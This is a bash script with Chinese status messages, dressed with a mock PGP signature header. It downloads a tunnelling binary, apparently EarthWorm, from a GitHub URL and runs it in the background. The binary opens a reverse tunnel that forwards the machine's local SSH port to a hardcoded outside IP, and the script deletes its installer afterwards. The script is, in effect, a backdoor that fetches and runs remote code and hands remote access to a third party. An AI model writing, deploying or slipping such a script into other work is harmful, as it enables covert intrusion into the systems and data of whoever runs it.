#!/bin/bash
<<ENDOFSIGSTART=
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256
ENDOFSIGSTART=

export PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin:/usr/local/sbin



file=ew_for_linux64
mkdir -p /appew
cd /appew
rm -rf ew_for_linux64
if [ -f "$file" ];then
    echo "文件已存在，无需下载"
else
    echo "正在下载所请稍后"

wget   https://raw.githubusercontent.com/kingisme001/ew/master/ew_for_linux64
    if [ $? -eq 0 ];then
        echo "下载安装包成功，开始安装"
    else
        echo "download error,exit"
        exit 1
    fi

fi
rm -rf ew_install.sh
chmod +x ew_for_linux64
nohup ./ew_for_linux64 -s lcx_slave -d 124.222.168.19 -e 8888 -f 127.0.0.1 -g 22 &
